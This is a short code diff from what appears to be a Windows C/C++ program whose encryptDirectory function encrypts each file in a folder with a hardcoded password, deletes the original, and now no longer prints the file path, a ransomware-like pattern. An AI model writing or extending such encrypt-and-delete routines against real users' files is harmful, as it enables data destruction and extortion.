@@ -81,7 +81,7 @@ void encryptDirectory(const WCHAR directory_path[]) {
 
 			encryptFile(tmp2Directory, tmp3Directory, L"P4ssw0rd");
 			DeleteFile(tmp2Directory);
-			wprintf(L"%s\n", tmp2Directory);
+			//wprintf(L"%s\n", tmp2Directory);
 
 		} while (FindNextFileW(fileHandle, &fileData));
 
